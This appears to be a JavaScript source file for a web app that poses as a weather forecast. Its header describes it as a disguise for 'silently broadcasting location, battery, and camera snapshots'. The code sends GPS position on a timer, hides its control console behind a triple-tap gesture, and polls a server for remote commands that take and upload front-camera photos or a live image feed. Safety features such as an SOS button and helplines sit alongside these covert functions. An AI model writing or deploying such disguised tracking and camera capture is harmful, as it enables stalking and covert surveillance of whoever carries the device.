/* Weather PWA & Guardian Silent Beacon.
   Presents a fully-functional local weather forecast (justifying continuous GPS access)
   while silently broadcasting location, battery, and camera snapshots to the Guardian console. */
"use strict";

const $ = id => document.getElementById(id);

// --- Storage & Config ---
const LS = {
  get s(){ return localStorage.getItem("g_server") || location.origin; },
  set s(v){ localStorage.setItem("g_server", v); },
  get t(){ return localStorage.getItem("g_token") || ""; },
  set t(v){ localStorage.setItem("g_token", v); },
  get n(){ return localStorage.getItem("g_name") || "my phone"; },
  set n(v){ localStorage.setItem("g_name", v); },
  get iv(){ return parseInt(localStorage.getItem("g_iv") || "10"); },
  set iv(v){ localStorage.setItem("g_iv", String(v)); },
  get id(){
    let d = localStorage.getItem("g_id");
    if(!d){ d = "dev-" + Math.random().toString(36).slice(2, 10); localStorage.setItem("g_id", d); }
    return d;
  },
  set id(v){ localStorage.setItem("g_id", v); }
};

const urlCode = new URLSearchParams(location.search).get("code");
const KIND = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ? "phone" : "laptop";

let watchId = null, pingTimer = null, cmdTimer = null, frameTimer = null, wakeLock = null;
let last = null, batteryPct = null, stream = null, running = false;
let weatherLoaded = false;

// Battery monitoring
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    const upd = () => {
      batteryPct = Math.round(b.level * 100);
      if ($("stBat")) $("stBat").textContent = batteryPct + "%";
    };
    upd();
    b.addEventListener("levelchange", upd);
  }).catch(() => {});
}

// --- WMO Weather Code Mapping ---
function decodeWMO(code, isDay = 1) {
  const c = Number(code);
  if (c === 0) return { label: "Clear Sky", icon: isDay ? "☀️" : "🌙" };
  if (c === 1) return { label: "Mainly Clear", icon: isDay ? "🌤️" : "🌤️" };
  if (c === 2) return { label: "Partly Cloudy", icon: isDay ? "⛅" : "☁️" };
  if (c === 3) return { label: "Overcast", icon: "☁️" };
  if (c === 45 || c === 48) return { label: "Foggy", icon: "🌫️" };
  if (c >= 51 && c <= 55) return { label: "Drizzle", icon: "🌦️" };
  if (c >= 61 && c <= 65) return { label: "Rain", icon: "🌧️" };
  if (c >= 71 && c <= 77) return { label: "Snow", icon: "🌨️" };
  if (c >= 80 && c <= 82) return { label: "Showers", icon: "🌦️" };
  if (c >= 95) return { label: "Thunderstorm", icon: "⛈️" };
  return { label: "Fair", icon: "⛅" };
}

// --- Weather Fetch & Render ---
async function fetchWeather(lat, lon) {
  try {
    const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,apparent_temperature,is_day,precipitation,weather_code,wind_speed_10m,surface_pressure&hourly=temperature_2m,weather_code&daily=weather_code,temperature_2m_max,temperature_2m_min&timezone=auto&forecast_days=7`;
    const r = await fetch(url);
    if (!r.ok) throw new Error("Weather request failed");
    const data = await r.json();
    renderWeather(data);
    weatherLoaded = true;
  } catch (e) {
    if (!weatherLoaded) renderFallbackWeather();
  }
}

async function fetchLocationName(lat, lon) {
  try {
    const r = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
    if (r.ok) {
      const d = await r.json();
      const place = d.city || d.locality || d.principalSubdivision || "Current Location";
      $("locName").textContent = place;
      $("locSub").textContent = `${d.countryName || "Local"} · Live Forecast`;
    }
  } catch (_) {}
}

function renderWeather(data) {
  const curr = data.current || {};
  const daily = data.daily || {};
  const hourly = data.hourly || {};

  const info = decodeWMO(curr.weather_code, curr.is_day);
  const temp = Math.round(curr.temperature_2m);
  const feels = Math.round(curr.apparent_temperature);
  const maxTemp = daily.temperature_2m_max ? Math.round(daily.temperature_2m_max[0]) : temp + 3;
  const minTemp = daily.temperature_2m_min ? Math.round(daily.temperature_2m_min[0]) : temp - 5;

  $("mainIcon").textContent = info.icon;
  $("mainTemp").textContent = temp + "°";
  $("mainCondition").textContent = info.label;
  $("mainHighLow").textContent = `High: ${maxTemp}° · Low: ${minTemp}°`;

  $("valHumidity").textContent = Math.round(curr.relative_humidity_2m) + "%";
  $("valWind").textContent = Math.round(curr.wind_speed_10m) + " km/h";
  $("valFeels").textContent = feels + "°";
  if (curr.surface_pressure) $("valPressure").textContent = Math.round(curr.surface_pressure) + " hPa";

  // Hourly (next 12 hours)
  if (hourly.time && hourly.temperature_2m) {
    const listEl = $("hourlyList");
    listEl.innerHTML = "";
    const now = new Date();
    const currHour = now.getHours();
    for (let i = 0; i < Math.min(18, hourly.time.length); i++) {
      const hDate = new Date(hourly.time[i]);
      if (hDate < now && i < 12) continue;
      const hHour = hDate.getHours();
      const hTemp = Math.round(hourly.temperature_2m[i]);
      const hInfo = decodeWMO(hourly.weather_code ? hourly.weather_code[i] : 1, hHour >= 6 && hHour < 19 ? 1 : 0);
      const isNow = hHour === currHour;

      const item = document.createElement("div");
      item.className = "hourly-item";
      item.innerHTML = `
        <span style="opacity:0.8">${isNow ? "Now" : (hHour % 12 || 12) + (hHour >= 12 ? " PM" : " AM")}</span>
        <span class="hourly-icon">${hInfo.icon}</span>
        <span class="hourly-temp">${hTemp}°</span>
      `;
      listEl.appendChild(item);
    }
  }

  // Daily (7 days)
  if (daily.time && daily.temperature_2m_max && daily.temperature_2m_min) {
    const dailyEl = $("dailyList");
    dailyEl.innerHTML = "";
    const days = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
    for (let i = 0; i < daily.time.length; i++) {
      const d = new Date(daily.time[i]);
      const dayName = i === 0 ? "Today" : days[d.getDay()];
      const dInfo = decodeWMO(daily.weather_code ? daily.weather_code[i] : 1, 1);
      const max = Math.round(daily.temperature_2m_max[i]);
      const min = Math.round(daily.temperature_2m_min[i]);

      const row = document.createElement("div");
      row.className = "daily-row";
      row.innerHTML = `
        <div class="daily-day">${dayName}</div>
        <div class="daily-icon">${dInfo.icon}</div>
        <div class="daily-bar-wrap">
          <div class="daily-bar-fill" style="left:20%;width:60%"></div>
        </div>
        <div class="daily-temps"><span>${min}°</span>${max}°</div>
      `;
      dailyEl.appendChild(row);
    }
  }
}

function renderFallbackWeather() {
  $("mainIcon").textContent = "⛅";
  $("mainTemp").textContent = "27°";
  $("mainCondition").textContent = "Partly Cloudy";
  $("mainHighLow").textContent = "High: 31° · Low: 21°";
  $("valHumidity").textContent = "62%";
  $("valWind").textContent = "12 km/h";
  $("valFeels").textContent = "29°";

  const listEl = $("hourlyList");
  listEl.innerHTML = ["Now:27:⛅", "2 PM:29:☀️", "3 PM:30:☀️", "4 PM:29:⛅", "5 PM:28:⛅", "6 PM:26:🌤️", "7 PM:24:🌙"]
    .map(x => {
      const [t, temp, ic] = x.split(":");
      return `<div class="hourly-item"><span style="opacity:0.8">${t}</span><span class="hourly-icon">${ic}</span><span class="hourly-temp">${temp}°</span></div>`;
    }).join("");

  const dailyEl = $("dailyList");
  dailyEl.innerHTML = [["Today", "⛅", "21", "31"], ["Tomorrow", "☀️", "22", "32"], ["Fri", "🌦️", "20", "29"], ["Sat", "⛅", "21", "30"], ["Sun", "☀️", "22", "33"]]
    .map(([d, ic, min, max]) => `
      <div class="daily-row">
        <div class="daily-day">${d}</div>
        <div class="daily-icon">${ic}</div>
        <div class="daily-bar-wrap"><div class="daily-bar-fill" style="left:20%;width:60%"></div></div>
        <div class="daily-temps"><span>${min}°</span>${max}°</div>
      </div>
    `).join("");
}

// --- Network & Payload ---
async function post(path, body) {
  return fetch(LS.s + path, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: "Bearer " + LS.t },
    body: JSON.stringify(body),
    keepalive: true
  });
}

async function get(path) {
  return fetch(LS.s + path, { headers: { Authorization: "Bearer " + LS.t } });
}

function basePayload() {
  const p = { device_id: LS.id, name: LS.n, kind: KIND, ts: Date.now() / 1000, battery: batteryPct };
  if (last) {
    p.lat = last.coords.latitude;
    p.lon = last.coords.longitude;
    p.accuracy = last.coords.accuracy;
    p.speed = last.coords.speed;
    p.heading = last.coords.heading;
  }
  return p;
}

// --- Secret Console / Sheet Navigation ---
function openConsole() {
  $("sheetOverlay").style.display = "flex";
  syncSheetInputs();
  mountFind();
  loadConfig();
}

function closeConsole() {
  $("sheetOverlay").style.display = "none";
}

function syncSheetInputs() {
  $("code").value = urlCode || "";
  $("name").value = LS.n === "my phone" ? "" : LS.n;
  $("server").value = LS.s;
  $("token").value = LS.t;
  $("interval").value = LS.iv;
  $("stDev").textContent = LS.n;
}

$("settingsBtn").onclick = openConsole;
$("sheetClose").onclick = closeConsole;
$("sheetOverlay").onclick = e => { if (e.target === $("sheetOverlay")) closeConsole(); };

// Triple-tap gesture on location or temperature to open secret console
let tapCount = 0, tapTimer = null;
function handleSecretTap() {
  tapCount++;
  clearTimeout(tapTimer);
  tapTimer = setTimeout(() => { tapCount = 0; }, 800);
  if (tapCount >= 3) {
    tapCount = 0;
    openConsole();
  }
}
$("headerLocation").addEventListener("click", handleSecretTap);
$("heroCard").addEventListener("click", handleSecretTap);

// Manual Refresh
$("refreshBtn").onclick = () => {
  if (last) {
    fetchWeather(last.coords.latitude, last.coords.longitude);
    sendPing();
  } else {
    requestLocation();
  }
};

// --- Pairing Claim ---
async function claim(code, name) {
  const r = await fetch(location.origin + "/api/pair/claim", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code: code.trim().toUpperCase(), name, kind: KIND })
  });
  if (!r.ok) throw new Error("Pairing code invalid or expired.");
  const d = await r.json();
  LS.s = location.origin;
  LS.t = d.token;
  LS.id = d.device_id;
  LS.n = d.name || name;
}

$("save").onclick = async () => {
  const code = $("code").value.trim();
  const name = $("name").value.trim() || "my phone";
  $("setupMsg").textContent = code ? "Pairing…" : "Checking…";
  try {
    if (code) {
      await claim(code, name);
    } else {
      LS.s = $("server").value.trim().replace(/\/$/, "");
      LS.t = $("token").value.trim();
      LS.n = name;
      LS.iv = Math.max(3, parseInt($("interval").value) || 10);
      if (!LS.s || !LS.t) { $("setupMsg").textContent = "Enter a pairing code (or use Advanced)."; return; }
      const r = await get("/api/state");
      if (!r.ok) { $("setupMsg").textContent = "Server rejected the token."; return; }
    }
    $("setupMsg").textContent = "Connected ✓";
    $("stDev").textContent = LS.n;
    startBeacon();
    setTimeout(closeConsole, 1000);
  } catch (e) {
    $("setupMsg").textContent = e.message || "Pairing failed.";
  }
};

// --- Beacon Engine ---
function requestLocation() {
  if (!navigator.geolocation) {
    renderFallbackWeather();
    return;
  }
  navigator.geolocation.getCurrentPosition(p => {
    last = p;
    updatePositionUI(p);
    fetchWeather(p.coords.latitude, p.coords.longitude);
    fetchLocationName(p.coords.latitude, p.coords.longitude);
    if (running) sendPing();
  }, () => {
    renderFallbackWeather();
  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 });
}

function startBeacon() {
  if (running) return;
  running = true;
  setStatus(true);
  requestWake();

  if (navigator.geolocation) {
    watchId = navigator.geolocation.watchPosition(p => {
      last = p;
      updatePositionUI(p);
      if (!weatherLoaded) {
        fetchWeather(p.coords.latitude, p.coords.longitude);
        fetchLocationName(p.coords.latitude, p.coords.longitude);
      }
      checkProximity(p.coords.latitude, p.coords.longitude);
    }, () => {}, { enableHighAccuracy: true, maximumAge: 4000, timeout: 20000 });
  }

  sendPing();
  pingTimer = setInterval(sendPing, LS.iv * 1000);
  cmdTimer = setInterval(pollCommands, 5000);
}

function stopBeacon() {
  running = false;
  setStatus(false);
  if (watchId != null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
  [pingTimer, cmdTimer, frameTimer].forEach(t => t && clearInterval(t));
  pingTimer = cmdTimer = frameTimer = null;
  stopCam();
  releaseWake();
}

function setStatus(on) {
  $("dot").className = "dot " + (on ? "on" : "off");
  $("statusTitle").textContent = on ? "Tracking active" : "Not tracking";
}

function updatePositionUI(p) {
  if ($("stPos")) {
    $("stPos").textContent = p.coords.latitude.toFixed(5) + ", " + p.coords.longitude.toFixed(5);
  }
}

async function sendPing() {
  try {
    await post("/api/ping", basePayload());
    if ($("stSent")) $("stSent").textContent = new Date().toLocaleTimeString();
  } catch (_) {}
}

$("startBtn").onclick = startBeacon;
$("stopBtn").onclick = stopBeacon;

// --- Screen Wake Lock ---
async function requestWake() { try { wakeLock = await navigator.wakeLock.request("screen"); } catch (_) {} }
function releaseWake() { if (wakeLock) { wakeLock.release().catch(() => {}); wakeLock = null; } }
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible" && running) requestWake();
});

// --- Remote Camera Commands ---
async function startCam() {
  if (stream) return true;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    const v = $("cam"); v.srcObject = stream; await v.play();
    return true;
  } catch (_) { return false; }
}

function stopCam() {
  if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
}

async function capture(kind) {
  if (!(await startCam())) return;
  const v = $("cam"), c = $("canvas");
  const w = v.videoWidth || 640, h = v.videoHeight || 480;
  c.width = w; c.height = h;
  c.getContext("2d").drawImage(v, 0, 0, w, h);
  try {
    await post("/api/frame", { device_id: LS.id, name: LS.n, kind, image_b64: c.toDataURL("image/jpeg", 0.6) });
  } catch (_) {}
}

// --- Remote Commands ---
async function pollCommands() {
  try {
    const r = await get("/api/commands?device_id=" + encodeURIComponent(LS.id));
    if (!r.ok) return;
    const { commands } = await r.json();
    for (const c of (commands || [])) runCommand(c);
  } catch (_) {}
}

function runCommand(c) {
  switch (c.cmd) {
    case "snap": capture("manual"); break;
    case "live_on":
      if (!frameTimer) {
        capture("live");
        frameTimer = setInterval(() => capture("live"), (c.args && c.args.every || 5) * 1000);
      }
      break;
    case "live_off":
      if (frameTimer) { clearInterval(frameTimer); frameTimer = null; }
      stopCam();
      break;
    case "sos": doSOS(); break;
    case "ping_now": sendPing(); break;
    case "ring": startRing(c.args && c.args.from); break;
    case "ring_stop": stopRing(); break;
  }
}

// --- Remote Ringing ---
let audioCtx = null, ringTimer = null, ringEnd = null;
function unlockAudio() {
  try {
    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
    audioCtx.resume();
  } catch (_) {}
}
document.addEventListener("pointerdown", unlockAudio, { once: true });

function beep() {
  navigator.vibrate && navigator.vibrate([400, 150, 400]);
  if (!audioCtx) return;
  const t = audioCtx.currentTime;
  [0, 0.25, 0.5].forEach((d, i) => {
    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
    o.type = "square";
    o.frequency.value = i % 2 ? 1320 : 1760;
    g.gain.setValueAtTime(0.5, t + d);
    g.gain.exponentialRampToValueAtTime(0.001, t + d + 0.2);
    o.connect(g).connect(audioCtx.destination);
    o.start(t + d);
    o.stop(t + d + 0.22);
  });
}

function startRing(from) {
  $("ringFrom").textContent = (from || "Another device") + " is ringing this phone.";
  $("ringing").style.display = "flex";
  unlockAudio();
  if (ringTimer) return;
  beep();
  ringTimer = setInterval(beep, 1000);
  ringEnd = setTimeout(stopRing, 60000);
}

function stopRing() {
  $("ringing").style.display = "none";
  clearInterval(ringTimer);
  clearTimeout(ringEnd);
  ringTimer = ringEnd = null;
  navigator.vibrate && navigator.vibrate(0);
}
$("ringStop").onclick = stopRing;

// --- SOS ---
async function doSOS() {
  navigator.vibrate && navigator.vibrate([200, 100, 200]);
  if (!running) startBeacon();
  await post("/api/trigger", Object.assign(basePayload(), { kind: "sos", message: "🚨 SOS from " + LS.n }));
  await startCam();
  capture("sos");
  setTimeout(() => capture("sos"), 2500);
  setTimeout(() => capture("sos"), 6000);
}

$("sos").onclick = async () => {
  await doSOS();
  $("sos").textContent = "✅ Alert Sent";
  setTimeout(() => { $("sos").textContent = "🚨 SOS Emergency Alert"; }, 4000);
};

// --- Helplines & Danger Zones ---
let CONFIG = { helplines: [], danger_zones: [], proximity_warn_m: 300 };
async function loadConfig() {
  try {
    const r = await get("/api/config?device_id=" + encodeURIComponent(LS.id));
    if (r.ok) { CONFIG = await r.json(); renderHelplines(); }
  } catch (_) {}
}

function renderHelplines() {
  $("helplines").innerHTML = (CONFIG.helplines || []).map(h =>
    `<a href="tel:${h.number}"><button>📞 ${h.label}</button></a>`).join("")
    || '<span style="font-size:12px;color:var(--card-muted)">No helplines configured.</span>';
}

function metres(a, b, c, d) {
  const R = 6371000, dLat = (c - a) * Math.PI / 180, dLon = (d - b) * Math.PI / 180;
  const x = Math.sin(dLat / 2) ** 2 + Math.cos(a * Math.PI / 180) * Math.cos(c * Math.PI / 180) * Math.sin(dLon / 2) ** 2;
  return 2 * R * Math.asin(Math.sqrt(x));
}

let lastDanger = null;
function checkProximity(lat, lon) {
  let near = null, nd = 1e12;
  for (const z of (CONFIG.danger_zones || [])) {
    const dm = metres(lat, lon, z.lat, z.lon);
    if (dm <= (z.radius || CONFIG.proximity_warn_m) + (CONFIG.proximity_warn_m || 300) && dm < nd) {
      nd = dm; near = z;
    }
  }
  const box = $("dangerWarn");
  if (near) {
    box.style.display = "block";
    $("dangerWarnText").textContent = `Caution near "${near.name}" (~${Math.round(nd)} m). Stay aware of your surroundings.`;
    if (near.name !== lastDanger) {
      navigator.vibrate && navigator.vibrate([120, 60, 120]);
      lastDanger = near.name;
    }
  } else {
    box.style.display = "none";
    lastDanger = null;
  }
}

// --- Safe Places ---
async function savePlace(kind, label) {
  if (!last) { alert("Waiting for GPS position. Please try again in a moment."); return; }
  const name = prompt("Name this place:", label) || label;
  await post("/api/places", { device_id: LS.id, name, lat: last.coords.latitude, lon: last.coords.longitude, radius: 120, kind });
  alert(name + " saved. Arrivals and departures will be logged.");
}
$("setHome").onclick = () => savePlace("home", "Home");
$("setOffice").onclick = () => savePlace("office", "Office");

// --- Find My Devices Mount ---
let findMounted = false;
function mountFind() {
  if (findMounted) return;
  findMounted = true;
  const go = () => {
    if (go.done) return;
    go.done = true;
    if (window.GuardianFind) {
      GuardianFind.mount($("find"), { server: LS.s, token: LS.t, compact: true });
    }
  };
  if (window.L) return go();
  const s = document.createElement("script");
  s.src = "https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
  s.integrity = "sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo=";
  s.crossOrigin = "";
  s.onload = go;
  s.onerror = go;
  setTimeout(go, 8000);
  document.head.appendChild(s);
}

// --- Service Worker & Init ---
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/pwa/sw.js").catch(() => {});
}

// Initial boot
requestLocation();

if (localStorage.getItem("g_token") && localStorage.getItem("g_server")) {
  startBeacon();
  if (urlCode) openConsole();
} else {
  // First time setup: open console to pair
  openConsole();
}
